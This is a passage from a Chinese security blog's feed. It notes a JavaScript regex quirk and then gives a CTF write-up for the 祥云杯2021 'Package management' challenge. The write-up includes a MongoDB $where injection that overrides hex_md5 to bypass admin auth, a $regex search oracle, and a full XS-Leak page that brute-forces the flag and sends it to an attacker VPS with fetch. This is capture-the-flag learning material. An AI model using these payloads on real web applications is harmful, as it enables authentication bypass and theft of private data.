football&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> regex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;foo*&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> globalRegex = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;foo*&#x27;</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(regex.<span class="title function_">test</span>(str));</span><br><span class="line"><span class="comment">// expected output: true</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalRegex.<span class="property">lastIndex</span>);</span><br><span class="line"><span class="comment">// expected output: 0</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalRegex.<span class="title function_">test</span>(str));</span><br><span class="line"><span class="comment">// expected output: true</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalRegex.<span class="property">lastIndex</span>);</span><br><span class="line"><span class="comment">// expected output: 9</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalRegex.<span class="title function_">test</span>(str));  <span class="comment">//从第九个位置开始找 所以找不到 emm</span></span><br><span class="line"><span class="comment">// expected output: false</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="number">0</span></span><br><span class="line">&gt; <span class="literal">true</span></span><br><span class="line">&gt; <span class="number">9</span></span><br><span class="line">&gt; <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>interesting！</p><h2 id="挑战2"><a href="#挑战2" class="headerlink" title="挑战2"></a>挑战2</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> password = <span class="title function_">prompt</span>(<span class="string">&#x27;input password&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> (!<span class="regexp">/^[a-zA-Z0-9]+$/</span>.<span class="title function_">test</span>(password)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;invalid password&#x27;</span>)</span><br><span class="line">    password = <span class="title function_">prompt</span>(<span class="string">&#x27;input password&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">// 如果可以在底下動態執行程式碼，拿得到 password 嗎？</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="title function_">prompt</span>(<span class="string">&#x27;try to get password&#x27;</span>))</span><br></pre></td></tr></table></figure><p>利用挑战1的stateful特性有可能吗？</p><p>怎么利用？用来爆破？差太多条件</p><p>要利用 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input</a></p><p><code>Regex.input</code> 函数</p><p>作者的答案 555 没好好打dicectf</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/hello/.<span class="title function_">test</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">RegExp</span>.<span class="property">input</span>) <span class="comment">// hello world</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">RegExp</span>.<span class="property">$_</span>) <span class="comment">// 同上</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;发现一些值得研究的知识 先开个坑&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/&quot;&gt;https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="Front-end" scheme="http://example.com/tags/Front-end/"/>
    
  </entry>
  
  <entry>
    <title>window.open 相关知识</title>
    <link href="http://example.com/2022/04/14/window-open/"/>
    <id>http://example.com/2022/04/14/window-open/</id>
    <published>2022-04-14T09:52:44.000Z</published>
    <updated>2022-04-27T16:47:14.004Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e952e23d352b3e3f8c4413c02e443ba65831d89ce6348ebad3136431e6f7679c">47567e029537999c3a78644677b0bb1c4e13c3cd7447bb2df027bba7a237fa1a784cea7c713624b06d7607ba0a23ed4476bca7e3461d497c804236691a018682d7cf637c29c7520de74c0d58f8d04f8569acf77f4098612de6ce040d4769dd0a2b74e4d92e7f6217c771d0c9626aede403149d61f0ab5f4d5741db52eef96b8ccd2ed723628bb82893e1d2df7c95c89df7008470403e7c123e9bf9294da903ecde5d04e2301663117e46e2f5ea37014584b06d9a3142535bc1988dda32ade6e1d689f2e7c42f8a41f7a49d564d5c5569dde864eb2391208c41f60e5bb2451de20e3a5cb51f066dad2641a4c89d230c918cd1c4e93ce8515d4c2b6c9f0b8ad1a78ff33f672db0a6aec7b61207c3dd5ed8aac3b6bf602ae5ca2c3057c6012a0317877b08533e412564dc69637d6579313f2383c0e0e656fd00248dea991e1b54d86b80ccff86676f0dc015f8427613a6b9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xsleak中的两种利用方式 -- HTTP cache &amp; object</title>
    <link href="http://example.com/2022/04/14/two-HIT-way-of-xsleak/"/>
    <id>http://example.com/2022/04/14/two-HIT-way-of-xsleak/</id>
    <published>2022-04-14T08:27:48.000Z</published>
    <updated>2022-04-27T16:46:59.064Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8629f86fcee745ddf9bd4090f87ab4b7ce91c441a34367c79469acf912b57893"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xsleaks-Search</title>
    <link href="http://example.com/2022/04/13/xsleaks-search/"/>
    <id>http://example.com/2022/04/13/xsleaks-search/</id>
    <published>2022-04-13T11:57:11.000Z</published>
    <updated>2022-04-14T00:34:32.668Z</updated>
    
    <content type="html"><![CDATA[<p>打算把 <a href="http://xsleak.dev/">http://xsleak.dev</a> 上的知识点全部过一遍 顺便找对应的题目来复现一下</p><span id="more"></span><h1 id="祥云杯2021-–-Package-management"><a href="#祥云杯2021-–-Package-management" class="headerlink" title="祥云杯2021 – Package management"></a>祥云杯2021 – Package management</h1><h2 id="content"><a href="#content" class="headerlink" title="content"></a>content</h2><p>有bot 典型的 xsleak</p><p>先看一下 csp</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req: Request, res: Response, next: NextFunction</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">session</span> = req.<span class="property">session</span>;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">csrfToken</span> = req.<span class="title function_">csrfToken</span>();</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&quot;default-src &#x27;none&#x27;;style-src &#x27;self&#x27; &#x27;sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=&#x27;;img-src &#x27;self&#x27;;form-action &#x27;self&#x27;;base-uri &#x27;none&#x27;;&quot;</span>);</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;X-Content-Type-Options&#x27;</span>,<span class="string">&#x27;nosniff&#x27;</span>);</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>看下flag的位置 存在了数据库里  会被 description 取出来  只会在 admin 的用户里出现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flag = &#123;</span><br><span class="line">            <span class="string">&quot;user_id&quot;</span>: admin.<span class="property">id</span>,</span><br><span class="line">            <span class="string">&quot;pack_id&quot;</span>: <span class="title function_">genPackageId</span>(admin.<span class="property">id</span>),</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Flag is here&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: process.<span class="property">env</span>.<span class="property">FLAG</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.1&quot;</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>所以我们的目标就是 leak 这个 description</p><p>那接下来就要看一下 view 咋写的  </p><p>在 packages.pug 文件里  发现了 <code>pack.description</code></p><p>应为是 <code>!&#123;package.description&#125;</code> 所以可以xss 根据csp 可在这里塞一个跳转的链接 跳到我们的vps上</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">block content </span><br><span class="line">  .<span class="property">container</span></span><br><span class="line">    <span class="keyword">if</span> error</span><br><span class="line">      .<span class="property">alert</span>.<span class="property">alert</span>-danger= error</span><br><span class="line">    <span class="keyword">if</span> message</span><br><span class="line">      .<span class="property">alert</span>.<span class="property">alert</span>-success.<span class="property">mx</span>-<span class="number">5</span>(role=<span class="string">&#x27;alert&#x27;</span>) #&#123;message&#125;</span><br><span class="line">    .<span class="property">row</span></span><br><span class="line">      each pack <span class="keyword">in</span> packs</span><br><span class="line">        .<span class="property">col</span>-lg-<span class="number">4.</span>col-md-<span class="number">6.</span>mb-<span class="number">4</span></span><br><span class="line">          .<span class="property">card</span>.<span class="property">h</span>-<span class="number">100</span></span><br><span class="line">            <span class="title function_">a</span>(href=<span class="string">`/packages/<span class="subst">$&#123;pack.pack_id&#125;</span>`</span>)</span><br><span class="line">              img.<span class="property">card</span>-img-<span class="title function_">top</span>(src=<span class="string">`/static/images/<span class="subst">$&#123;pack.name&#125;</span>.png`</span>, alt=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            .<span class="property">card</span>-body</span><br><span class="line">              h4.<span class="property">card</span>-title</span><br><span class="line">                <span class="title function_">a</span>(href=<span class="string">`/packages/<span class="subst">$&#123;pack.pack_id&#125;</span>`</span>) #&#123;pack.<span class="property">name</span>&#125;</span><br><span class="line">              p.<span class="property">card</span>-text.<span class="property">text</span>-truncate</span><br><span class="line">                | #&#123;pack.<span class="property">description</span>&#125;</span><br><span class="line">            .<span class="property">card</span>-footer</span><br><span class="line">              small.<span class="property">text</span>-muted v#&#123;pack.<span class="property">version</span>&#125;</span><br></pre></td></tr></table></figure><p>那么接下来就是找到一个可以用来leak的点</p><p>查找了一下和 description 相关的函数</p><p>我们发现有一个 add package 的功能</p><p> 接下来注意到了 list 功能  是按照 description 进行搜索</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line"><span class="keyword">const</span> packs = <span class="keyword">await</span> <span class="title class_">Package</span>.<span class="title function_">find</span>(&#123; <span class="attr">user_id</span>: req.<span class="property">session</span>.<span class="property">userId</span> &#125;);</span><br><span class="line"><span class="keyword">if</span> (packs.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> &#123; search &#125; = req.<span class="property">query</span>;</span><br><span class="line"><span class="keyword">if</span> (search) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">let</span> description = search;</span><br><span class="line"><span class="keyword">let</span> name = search;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> description === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">description = &#123; description &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> name === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">name = &#123; name &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> packs = <span class="keyword">await</span> <span class="title class_">Package</span>.<span class="title function_">find</span>(&#123;</span><br><span class="line"><span class="attr">user_id</span>: req.<span class="property">session</span>.<span class="property">userId</span>,</span><br><span class="line"><span class="attr">$or</span>: [name, description],</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">if</span> (packs.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;packages&#x27;</span>, &#123; packs &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">500</span>))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;packages&#x27;</span>, &#123; packs &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/packages/</span>list?search[description][<span class="variable">$regex</span>]=flag^</span><br></pre></td></tr></table></figure><p>可以用来查询description</p><p>接下来需要过 auth  这就要回到登录注册那部分去找了</p><p>怎么说呢 这里存在 注入  但我们先不考虑注入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/auth&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; token &#125; = req.<span class="property">body</span>;</span><br><span class="line"><span class="keyword">if</span> (token !== <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> (token) === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">checkmd5Regex</span>(token)) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">let</span> docs = <span class="keyword">await</span> <span class="title class_">User</span>.$where(<span class="string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="subst">$&#123;token.toString()&#125;</span>&quot;`</span>).<span class="title function_">exec</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(docs);</span><br><span class="line"><span class="keyword">if</span> (docs.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(docs[<span class="number">0</span>].<span class="property">isAdmin</span> === <span class="literal">true</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Failed to auth&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;No matching results&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Token must be valid md5 string&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;auth&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Parameters error&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">AccessGranted</span> = <span class="literal">true</span></span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages/submit&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>需要我们使用 admin 密码得 md5 </p><p>这里我看到大佬用竞争的方法 更改 hex_md5 函数 在下属是佩服</p><p>这里我们用一个hello的md5</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex_md5=function()&#123;return &#x27;5d<span class="number">4140</span>2abc4b2a76b<span class="number">9719</span>d<span class="number">911017</span>c592&#x27;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /packages/list?search[<span class="variable">$where</span>]=hex_md5=<span class="keyword">function</span>()&#123;<span class="keyword">return</span><span class="meta">%20</span><span class="meta">%275d41402abc4b2a76b9719d911017c592</span><span class="meta">%27</span>&#125; </span><br></pre></td></tr></table></figure><p>卧槽 nb 真的成功了  似乎这里并不需要竞争？  我过段时间发还是可以过auth的</p><p>提交我们构造的恶意的包 此时bot就会访问我们的页面并被重定向到我们自己的页面，再结合刚才的search 就可以进行xsleak</p><p>最后我们需要的是一个 hit</p><blockquote><p>而具体 leak 的方法。我们使用<code>object</code>标签。它能在火狐环境下做到，如果<code>object.data</code>访问状态码 200，就会触发 onload 事件。如果访问状态码 404，就会触发 onerror 事件。我们根据这个差异性，就能利用 search 注出 flag 内容了</p></blockquote><p>代码 来自 <a href="https://www.scuctf.com/ctfwiki/web/9.xss/xsleaks/">https://www.scuctf.com/ctfwiki/web/9.xss/xsleaks/</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> <span class="variable constant_">VPS_IP</span> = <span class="string">&#x27;http://*&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> <span class="title function_">escape</span> = (<span class="params">c</span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> c.<span class="title function_">replace</span>(<span class="regexp">/[.*+?^=!:$&#123;&#125;()|[\]\/\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> <span class="title function_">oracle</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">const</span> object = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;object&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            object.<span class="property">data</span> = url;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            object.<span class="property">onload</span> = resolve;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            object.<span class="property">onerror</span> = reject;  </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(object);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">const</span> <span class="title function_">search</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">await</span> <span class="title function_">oracle</span>(url)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">return</span> <span class="literal">true</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125; <span class="keyword">catch</span> (e) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    (<span class="keyword">async</span> () =&gt; &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">let</span> flag = <span class="string">&#x27;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">let</span> url = <span class="string">`http://localhost:8000/packages/list?search[description][$regex]=^<span class="subst">$&#123;flag&#125;</span>`</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">while</span> (flag.<span class="title function_">charAt</span>(flag.<span class="property">length</span> - <span class="number">1</span>) !== <span class="string">&quot;&#125;&quot;</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">for</span> ( <span class="keyword">let</span> i <span class="keyword">of</span> chars ) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">if</span> ( <span class="title function_">await</span>(<span class="title function_">search</span>(url + <span class="built_in">escape</span>(i))) ) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                url = url + <span class="built_in">escape</span>(i)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                flag += i</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;VPS_IP&#125;</span>/?flag=<span class="subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>&#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">break</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;   <span class="keyword">else</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;)();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://deelay.me/10000/http://example.com&quot;</span>/&gt;</span></span></span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure><h2 id="about-object-and-cache"><a href="#about-object-and-cache" class="headerlink" title="about object and cache"></a>about object and cache</h2><p>打算再写一篇blog记录一下</p><p><a href="https://portswigger.net/daily-swig/new-xs-leak-techniques-reveal-fresh-ways-to-expose-user-information">https://portswigger.net/daily-swig/new-xs-leak-techniques-reveal-fresh-ways-to-expose-user-information</a></p><p><a href="https://infosecwriteups.com/cross-site-content-and-status-types-leakage-ef2dab0a492">https://infosecwriteups.com/cross-site-content-and-status-types-leakage-ef2dab0a492</a></p><p><a href="https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html">https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html</a></p>]]></content>
    
    
